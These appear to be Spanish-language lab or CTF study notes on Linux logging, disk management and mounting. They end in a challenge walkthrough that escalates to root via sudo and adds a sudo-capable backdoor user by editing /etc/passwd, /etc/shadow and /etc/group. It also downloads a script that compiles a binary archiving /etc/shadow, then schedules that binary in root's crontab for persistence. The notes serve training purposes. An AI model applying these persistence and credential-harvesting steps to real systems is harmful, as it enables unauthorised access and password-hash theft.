kali@kali:~$ sudo tail -3 /var/log/auth.log
Jul  7 14:01:38 kali sudo: pam_unix(sudo:session): session closed for user roo
Jul  7 14:01:48 kali sudo:    kali : TTY=pts/0 ; PWD=/home/kali ; USER=root ; COMMAND=/usr/bin/tail -3 /var/log/auth.log
Jul  7 14:01:48 kali sudo: pam_unix(sudo:session): session opened for user root(uid=0) by (uid=1000)
```

Aunque no todos los ficheros tienen una estructura lineal como esta sino otro tipo de estructuras. Por ejemplo, el fichero /var/log/wtmp tiene una estrucutra de tabla y necesita abrirse con 'who' o 'last':

```bash
kali@kali:~$ who /var/log/wtmp | tail -5 
robert   tty7         2021-07-03 09:46 (:0)
nichole  tty7         2021-07-03 11:53 (:0)
kali     tty7         2021-07-06 08:04 (:0)
robert   tty7         2021-07-06 15:09 (:0)
kali     tty7         2021-07-07 14:03 (:0)
```

Este registro muestra varios usuarios, incluido nuestro usuario *kali*, iniciando sesión en la máquina durante varios días.

Además de los registros que ya hemos revisado, también podemos encontrar registros para otros tipos de eventos. Por ejemplo, el kernel emite mensajes que almacena en un ring buffer cada vez que sucede algo interesante (como la inserción de un nuevo dispositivo USB, una operación fallida del disco duro o la detección inicial de hardware en el arranque). Podemos recuperar los registros del kernel con el comando *dmesg* .

```bash
root@linux04:/etc# dmesg | head
[    0.000000] Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 (Ubuntu 5.4.0-42.46-generic 5.4.44)
[    0.000000] Command line: BOOT_IMAGE=/vmlinuz-5.4.0-42-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
[    0.000000] KERNEL supported cpus:
[    0.000000]   Intel GenuineIntel
[    0.000000]   AMD AuthenticAMD
[    0.000000]   Hygon HygonGenuine
[    0.000000]   Centaur CentaurHauls
[    0.000000]   zhaoxin   Shanghai  
[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: 'x87 floating point registers'
[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: 'SSE registers'
```

Por último, _systemd_ también almacena varios registros (salida de stdout/stderr de servicios, mensajes de syslog, registros de kernel) y facilita su consulta con *journalctl* .

```bash
root@linux04:/etc# journalctl | head
-- Logs begin at Wed 2021-08-04 12:29:09 UTC, end at Mon 2023-01-02 13:33:10 UTC. --
Aug 04 12:29:09 linux04 kernel: Linux version 5.4.0-42-generic (buildd@lgw01-amd64-038) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #46-Ubuntu SMP Fri Jul 10 00:24:02 UTC 2020 (Ubuntu 5.4.0-42.46-generic 5.4.44)
Aug 04 12:29:09 linux04 kernel: Command line: BOOT_IMAGE=/vmlinuz-5.4.0-42-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro ipv6.disable=1 maybe-ubiquity
Aug 04 12:29:09 linux04 kernel: KERNEL supported cpus:
Aug 04 12:29:09 linux04 kernel:   Intel GenuineIntel
Aug 04 12:29:09 linux04 kernel:   AMD AuthenticAMD
Aug 04 12:29:09 linux04 kernel:   Hygon HygonGenuine
Aug 04 12:29:09 linux04 kernel:   Centaur CentaurHauls
Aug 04 12:29:09 linux04 kernel:   zhaoxin   Shanghai  
Aug 04 12:29:09 linux04 kernel: Disabled fast string operations
```

- Sin ningún argumento, journalctl volcará todos los registros disponibles cronológicamente. 

- Con la opción -r, invertirá el orden para que los mensajes más nuevos se muestren primero. 

- Con la opción -f, journalctl imprimirá continuamente nuevas entradas de registro a medida que se agregan a su base de datos. 

- Finalmente, la opción -u puede limitar los mensajes a aquellos emitidos por una unidad systemd específica. Por ejemplo, podríamos volcar los registros disponibles pertenecientes a ssh.service con journalctl -u ssh.service .

<br />

**Exercises**

**¿Cuál es el usuario que se ha logeado antes que nosostros?**

Acudimos al registro /var/log/wtmp que muestra los usuarios logeados en el sistema y seguidamente ejecutamos el comando 'who /var/log/wtmp | tail -2' para obtener el nuestro y el inmediatamente superior.

```bash
root@linux04:~# who /var/log/wtmp | tail -2
chuck    tty1         2021-08-04 12:29
root     pts/0        2023-01-02 16:46 (192.168.49.57)
```

Observamos que como nuestra conexión es a través de SSH se indica la IP source.

<br />

**¿Cuál es la dirección IP de la conexión remota en el fichero proporcionado wtmp.exercise file?**

Lo abrimos con el comando 'who' y obtenemos:

```bash
who /home/kali/Desktop/d34b9deb18990e8c1347579a4b0d44e3-wmtp.exercise 
kali     tty7         2020-07-27 13:28 (:0)
kali     tty7         2020-07-27 13:31 (:0)
kali     tty7         2020-07-27 13:36 (:0)
kali     tty7         2021-02-18 20:31 (:0)
kali     tty7         2021-02-22 08:10 (:0)
kali     tty7         2021-02-24 08:33 (:0)
kali     tty7         2021-02-24 08:37 (:0)
kali     pts/1        2021-03-09 18:43 (192.168.49.134)
```

<br />

**¿Qué run level tiene actualmente el sistema?**

Los 'running levels' son estados en los que el sistema operativo corre de acuerdo a las necesidades del sistema. Las distintas posibilidades son:

-   **0** - Hal
-   **1** - Single-user text mode
-   **2** - Not used (user-definable)
-   **3** - Full multi-user text mode
-   **4** - Not used (user-definable)
-   **5** - Full multi-user graphical mode (with an X-based login screen)
-   **6** - Reboo

Y podemos obtener el nivel actual a través del comando 'runlevel'.

```bash
root@linux04:~# runlevel
N 5
```

<br />

**¿Qué usuarios están activos actualmente?**

Podemos listar aquellos usuarios que están actualmente activos mediante el comando 'w' o el comando 'who':

```bash
root@linux04:~# who
root     pts/0        2023-01-02 16:46 (192.168.49.57)
root@linux04:~# w
 17:22:41 up 40 min,  1 user,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/0    192.168.49.57    16:46    1.00s  0.03s  0.01s w
```

<br />

**Apache normalmente está capacitada para escribir en varios archivos registros pero actualmente está configurado para escribir sólo en uno. ¿Cuál es?**

Acudimos a /var/log y lo listamos recursivamente y filtramos por el término apache:

```bash
root@linux04:/var/log# ls -lR | grep apache
drwxr-x---  2 root      adm               4096 Jan  2 16:44 apache2
./apache2:
-rw-r----- 1 root adm   0 Jan  2 16:44 apache-custom.log
```

<br />

**Un comando invalido está generando un error en el inicio del servicio Apache2 ¿Cuál?**

En primer lugar intentamos iniciar el servicio Apache2:

```bash
root@linux04:/etc/apache2# systemctl start apache2
Job for apache2.service failed because the control process exited with error code.
See "systemctl status apache2.service" and "journalctl -xe" for details.
```

De esta forma, ejecutamos 'journalctl -xe' y revisando los mensajes de error obtenemos el siguiente mensaje:

```bash
Jan 02 17:48:00 linux04 apachectl[3379]: AH00526: Syntax error on line 228 of /etc/apache2/apache2.conf:
```

Así, extraemos esta linea y obtenemos que el comando que está generando el error:

```bash
root@linux04:/etc/apache2# cat -n /etc/apache2/apache2.conf | grep 228
228	IncorrectDirective true
```

<br />

### 10. Disk Management.

#### 10.1. Espacio de memoria, Particiones y Dispositivos Externos.

En esta sección vamos a ver herramientas y utilidades para interaccionar con el disco y memoria del sistema en Linux.

Las utilidades que aquí presentamos son: free, dd, du, df and mount. 

- El comando *free* despliega información sobre la memoria, además están añadidas las opciones '-m' y '-g' para desplegar información en distintas unidades de bytes:

```bash
kal@kali:~$ free -m
          total     used      free    shared  buff/cache   available
Mem:       1982      425       269         3        1287        1369
Swap:       974       15       959
```

- El comando 'df' es un acrónimo 'disk free' e informa sobre el espacio de disco disponible en cada uno de los discos montados en el sistema de archivos. Su opción -h (para lectura humana) convierte los tamaños en una unidad más legible, generalmente mebibytes o gibibytes:

```bash
kali@kali:~$ df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            958M     0  958M   0% /dev
tmpfs           199M  1.2M  198M   1% /run
/dev/sda1        19G   10G  7.7G  57% /
tmpfs           992M  8.0K  992M   1% /dev/shm
tmpfs           5.0M     0  5.0M   0% /run/lock
tmpfs           199M   68K  199M   1% /run/user/1000
```

Hay algunos otros comandos y opciones que también podemos usar.

- *dd* se usa principalmente para copiar sin procesar un archivo de dispositivo en un nivel de bloque.

- *du* se puede utilizar para determinar el tamaño de archivos y directorios. La opción _-hs_ generalmente se usa para hacer que la salida sea más legible para los humanos.

- *df* y su opción *-T* se pueden usar para mostrar el tipo de sistema de archivos.

Una de las diferencias clave entre Linux y otros sistemas operativos es que en Linux tenemos que *montar* un sistema de archivos antes de poder usarlo (Montar consiste en volver accesible los contenidos de un dispositivo a través del sistema de ficheros). 

Dado que los sistemas Linux tienen un solo árbol de directorios, si tuviéramos que insertar una unidad USB (por ejemplo), tendríamos que crear una ubicación asociada en algún lugar de ese árbol. La creación de esa ubicación asociada se denomina *montaje* .

El comando *mount* se puede usar para mostrar los sistemas de archivos montados actualmente y sus tipos. También se puede usar para montar particiones o archivos de disco de imagen en un punto de montaje.

Ejecutemos el comando de montaje con la opción -t para mostrar un determinado tipo de sistema de archivos montado. En este caso, mostraremos las particiones formateadas como ext4, que es el sistema de archivos para esta máquina:

```bash
kali@kali:~$ mount -t ext4
/dev/sda1 on / type ext4 (rw,relatime,errors=remount-ro)
kali@kali:~$
```

Así por ejemplo, si insertarámos un USB en el sistema, primero querríamos tener información sobre el mismo, para lo cual utilizaríamos la utilidad 'fdisk':

```bash
kali@kali:~$ sudo fdisk -l
[sudo] password for kali: 

Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Disk model: VMware Virtual S
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0xb31f280c

Device     Boot    Start      End  Sectors  Size Id Type
/dev/sda1  *        2048 39942143 39940096   19G 83 Linux
/dev/sda2       39944190 41940991  1996802  975M  5 Extended
/dev/sda5       39944192 41940991  1996800  975M 82 Linux swap / Solaris

Disk /dev/sdb: 980 MiB, 1027604480 bytes, 2007040 sectors
Disk model: TD Classic 003C 
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x5381b121

Device     Boot Start     End Sectors  Size Id Type
/dev/sdb1  *       32 2007039 2007008  980M  b W95 FAT32
```

La primera parte de la salida, con 20 GiB de memoria, es nuestra máquina local. También observamos otro disco listado aquí con 980 MiB de memoria. Esta es nuestra unidad USB. También anotaremos la ubicación del dispositivo, que es /dev/sdb1. Esto será útil más adelante.

Ahora para montar el dispositivo con la finalidad de acceder a sus contenidos. En primer lugar, creamos un punto de montaje eligiendo un directorio (existente o creado). Es común usar el directorio /mnt ya existente para esto, así que crearemos un subdirectorio llamado /usb . A continuación, ejecutaremos el comando *mount* y proporcionaremos la ubicación del dispositivo, así como la ubicación del punto de montaje. Podemos obtener la ubicación del dispositivo, /dev/sdb1 del comando anterior:

```bash
kali@kali:~$ sudo mkdir /mnt/usb

kali@kali:~$ sudo mount /dev/sdb1 /mnt/usb

kali@kali:~$ cd /mnt/usb

kali@kali:/mnt/usb$ ls -la
total 2100
drwxr-xr-x 3 root root   4096 Dec 31  1969 .
drwxr-xr-x 3 root root   4096 Jul  8 11:12 ..
-rwxr-xr-x 1 root root 817959 Feb 16 10:45 IMG_3396.jpg
-rwxr-xr-x 1 root root 739123 Feb 16 10:45 IMG_3794.jpg
-rwxr-xr-x 1 root root 426757 Feb 16 10:45 IMG_5042.jpg
```

Finalmente, para quitar el USB de forma segura utilizamos el comando 'umount':

```bash
kali@kali:/mnt/usb$ sudo umount /mnt/usb 
umount: /mnt/usb: target is busy.

kali@kali:/mnt/usb$ cd ~

kali@kali:~$ sudo umount /mnt/usb

kali@kali:~$ 
```

<br />

**Exercises**

**¿Cuál es el tipo de sistema de ficheros de root (/) en la máquina objetivo?**


Utilizamos la utilidad 'df -T' para desplegar el sistema de ficheros y también ver su tipo:

```bash
root@linux04:/etc/apache2# df -T
Filesystem                        Type     1K-blocks    Used Available Use% Mounted on
udev                              devtmpfs    974060       0    974060   0% /dev
tmpfs                             tmpfs       203544    1112    202432   1% /run
/dev/mapper/ubuntu--vg-ubuntu--lv ext4      20511312 4844328  14602024  25% /
...
```

De esta forma, el tipo de sistema de ficheros asociados a / es ext4.

<br />

**¿Qué directorio base (es decir, qué directorio directamente debajo de /) está utilizando la mayor parte del espacio?**

Empleamos el comando 'du -sh':

```bash
root@linux04:/# du -sh /*
0	/bin
101M	/boo
4.0K	/cdrom
0	/dev
5.9M	/etc
148K	/home
0	/lib
0	/lib32
0	/lib64
0	/libx32
16K	/lost+found
4.0K	/media
4.0K	/mn
4.0K	/op
du: cannot access '/proc/7079/task/7079/fd/4': No such file or directory
du: cannot access '/proc/7079/task/7079/fdinfo/4': No such file or directory
du: cannot access '/proc/7079/fd/3': No such file or directory
du: cannot access '/proc/7079/fdinfo/3': No such file or directory
0	/proc
244K	/roo
1.1M	/run
0	/sbin
1.1G	/snap
4.0K	/srv
2.1G	/swap.img <- Observemos que este no es la respuesta porque no es un directorio.
0	/sys
68K	/tmp
1.8G	/usr
838M	/var
```

Para obtener el espacio ocupado en disco de todos los directorios debajo de /. 

<br />

**3. En la máquina de destino, monte _flag.img_ ubicado en /root y luego lea flag.txt para obtener la bandera.**

```bash
root@linux04:/# mkdir /tmp/flag
root@linux04:/# mount /root/flag.img /tmp/flag
root@linux04:/# cd /tmp/flag
root@linux04:/tmp/flag# ls
flag.txt  lost+found
root@linux04:/tmp/flag# cat flag.txt 
OS{mounting_the_flag!!}
```

### 11. Linux Challenge.

**1. Connect to the target machine with the credentials "brandon:moneytree". Analyze the .doc, .txt. and .csv files on the machine to research if you can find any useful information about the machine. What is the flag in Brandon's home directory?**

Accedemos a la máquina y encontramos la flag en el home de brandon.

<br />

**2. Find Katy's credentials and log in as this user. What is the flag in Katy's home directory?**

Realizando un trabajo de enumeración encontramos un fichero en '/' llamado 'katy-stuff.csv' en el encontramos las credenciales 'katy:jurisdiction'. Además, inspeccionando los grupos a los que este usuario pertenece encontramos que pertenece al grupo sudo. 

```bash
katy@linux05:~$ id
uid=1001(katy) gid=1001(katy) groups=1001(katy),27(sudo)
```

Para cerciorarnos, ejecutamos 'sudo -l' con la finalidad de ver hasta que punto se extiende el uso del comando 'sudo':

```bash
katy@linux05:~$ sudo -l
[sudo] password for katy: 
Sorry, try again.
[sudo] password for katy: 
Matching Defaults entries for katy on linux05:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User katy may run the following commands on linux05:
   (ALL : ALL) ALL
```

Con lo que podemos correr todos los comandos en el sistema. Así, ejecutamos 'sudo -i' e introducimos la contraseña de 'katy' escalando verticalmente privilegios hacia el super usuario.

```bash
katy@linux05:~$ sudo -i
root@linux05:~#
```

<br />

**3. Utilice el nivel de acceso de katy para agregar un usuario a la máquina con las credenciales "jesse:thisismine". Dale al nuevo usuario los mismos permisos que le pertenecen a katy. Luego ejecute el binario 'newuser_check' en /home de katy para obtener la flag.**

Como hemos escalado privilegios y somos root, poseemos la facultad de añadir un nuevo usuario ya que podemos manipular los ficheros /etc/passwd, /etc/shadow 7 /etc/group.

Para añadir el usuario copiamos una linea del fichero /etc/passwd:

```bash
katy:x:1001:1001::/home/katy:/bin/bash
```

y cambiamos el nombre, el directorio home y el UID y GID:

```bash
jesse:x:1002:1001::/home/jesse:/bin/bash
```

Observemos que hemos añadido a jesse en el grupo katy pues deben compartir permisos.

Como sabemos, el campo que contiene una 'x' indica que la contraseña está hasheada en el archivo /etc/shadow. Así, utilizamos el comando 'mkpasswd' para añadir el hash de la contraseña 'thisismine'.

En primer lugar, obtenemos una línea del fichero /etc/shadow:

```defaul
katy:$6$5rcvylav3TuHVuLS$nQh1dymT6wlkb0HjEHFdSsKdBhf1cVhGie9Rmmi7.Tw2KjFo.4HvxgNWyuAaFY7nH4k7.3/zXlxRU/8Ix6edl1:18843:0:99999:7:::
```

Sabemos que esta línea está dividida en campos de entre los nos interesan los dos primeros que es nombre de usuario y el hash de la contraseña respectivamente. A su vez, el hash de la contraseña tiene la forma '\$id\$salt\$hash'. 

- El 'id' es un número que designa el formato de hash que hemos designado, en este caso el 6 designa el SHA-512.

- El 'salt' es un relleno para volver más complejo el hash de forma que este sea menos identificable.

- El 'hash' es el hash de la propia contraseña en el formato descrito por el 'id'.

De esta forma, el hash de la contraseña es:

```bash
mkpasswd --method=SHA-512 thisismine
$6$6qhs4kvUJ6r3F0.k$FQTiyFU9xQjjd2FHS.UXzrxHVO6rdAf03S46ekW4DhdI8bVaN90EuyR5nAXrvFmf1dGz8zaQxfaeAYqRoCU7X1
```

la línea que debemos añadir es:

```defaul
jesse:$6$6qhs4kvUJ6r3F0.k$FQTiyFU9xQjjd2FHS.UXzrxHVO6rdAf03S46ekW4DhdI8bVaN90EuyR5nAXrvFmf1dGz8zaQxfaeAYqRoCU7X1:18843:0:99999:7:::
```

Para comprobar que hemos añadido correctamente el usuario volvemos a nuestra sesión con katy e intentamos acceder a la cuenta de jesse con 'su' y las credenciales construidas anteriormente:

```bash
katy@linux05:~$ su jesse
Password: 
jesse@linux05:/home/katy$ id
uid=1002(jesse) gid=1001(katy) groups=1001(katy)
```

Observamos que ha funcionado, ahora lo que queda es incluir al nuevo usuario en el grupo '27 (sudo)'. Para ello bastará con modificar como root el fichero /etc/group y añadimos a jesse junton con katy separado por comas tal y como se puede ver a continuación:

```defaul
root@linux05:~# vi /etc/group
...
floppy:x:25:
tape:x:26:
sudo:x:27:katy,jesse
audio:x:29:
dip:x:30:
...
```

Para realizar la última comprobación nos logeamos como Jesse y:

```bash
katy@linux05:~$ su jesse
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

jesse@linux05:/home/katy$ id
uid=1002(jesse) gid=1001(katy) groups=1001(katy),27(sudo)
jesse@linux05:/home/katy$ sudo -l
[sudo] password for jesse: 
Matching Defaults entries for jesse on linux05:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jesse may run the following commands on linux05:
   (ALL : ALL) ALL
jesse@linux05:/home/katy$ exit
```

Observamos que estamos en el grupo 'sudo' y que al ejecutar 'sudo -l' no hay límites en los comandos que podemos ejecutar como root.

<br />

**4. Hay una unidad USB conectada a esta máquina que no se ha montado. Monte la unidad y busque su contenido para encontrar la siguiente bandera.**

Al tratarse de un dispositivo externo, buscamos en /dev un archivo que sea del tipo 'filesystem' con el siguiente comando:

```defaul
root@linux05:/# for i in $(ls /dev -R); do file /dev/$i;done | grep filesystem
/dev/usb: Linux rev 1.0 ext2 filesystem data, UUID=7352c0a1-f2b4-4ded-97be-9b03ca1cfcce (extents) (64bit) (large files) (huge files)
```

Observamos que el único archivo que parece ser un sistema de ficheros es uno denominado '/dev/usb'. Ese es nuestro usb y lo montamos creando un punto de montaje en /mnt como directorio 'usb' y con la utiliadad 'mount' montamos la imagen a través del siguiente comando:

```defaul
root@linux05:/# mkdir /mnt/usb; mount /dev/usb /mnt/usb; ls /mnt/usb
bad-flag.csv  flag.txt  lost+found  wrong-flag.doc
```

<br />

**5. ¿Cuántos archivos .doc y .csv en total hay en la máquina de destino (incluida la unidad adicional)?**

Aplicamos el siguiente comando:

```defaul
root@linux05:/# (find / -name '*.doc' 2>/dev/null && find / -name '*.csv' 2>/dev/null) | wc -l
15
```

<br />

**6. ¿Cuál es la bandera en el directorio de inicio de la raíz?** 

Lo buscamos con el siguiente comando:

```bash
find /root -name '*flag*' 2>/dev/null
```

<br />

**7. Copie el archivo backup.sh proporcionado en la máquina de destino y ejecútelo. Este script nos ayudará a crear una puerta trasera más persistente para el sistema. Otorgue permisos ejecutables a este script y luego ejecútelo para crear la copia de _seguridad_ del archivo. Copie la copia de seguridad del archivo resultante en /usr/bin/backup en la máquina de destino. Asegúrese de que el archivo sea propiedad de root y luego programe un crontab en todo el sistema que ejecute este script a las 2 a. m. todos los días. Finalmente, ejecute el binario backup_check ubicado en el directorio de inicio de la raíz para obtener el indicador.**

En primer lugar, abrimos en nuestra máquina local un servidor http con pyhton en el directorio en el que tenemos el fichero 'backup.sh'.

```bash
python3 -m http.server                                                                                      
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y lo descargamos desde la máquina víctima con 'curl':

```bash
curl <IP>:8000/backup.sh
```

Y examinamos el script:

```bash
#!/usr/bin/bash

echo "#include <stdlib.h>" > backup.c
echo "int main(int argc, char *argv[]) {" >> backup.c
echo 'system("tar -czvf /var/backups/backup.tar.gz /etc/shadow");' >> backup.c
echo "return 0;" >> backup.c
echo "}" >> backup.c
gcc backup.c -o backup
```

Observamos que se trata de un código que genera un código en C y lo compila:

```C
#include <stdlib.h>
int main(int argc, char *argv[]) {
system("tar -czvf /var/backups/backup.tar.gz /etc/shadow
return 0
}
```

Este código a su vez recopila en un archivo comprimido 'tar' los contenidos de /etc/shadow. La idea por tanto parece clara, se trata ed un código que genera un ejecutable que guarda los hashes de contraseñas de los usuarios del sistema. Si este programa se ejecutase periódicamente en la máquina tendríamos una copia de seguridad de los hashes de contraseña del sistema que nos garantizaría una persistencia en el mismo.

Así, ejecutamos el script y llevamos el ejecutable a '/usr/bin':

```bash
chmod +x backup.sh; ./backup.sh; mv backup /usr/bin/backup
```

Ahora, programos la ejecución periódica de este binario a través de /etc/crontab:

```bash
0  2    * * *   root    /usr/bin/backup
```

Esta línea ejecutará el /usr/bin/backup todos los dias a la hora 2 minuto 0, es decir, todos los días a las 2:00.














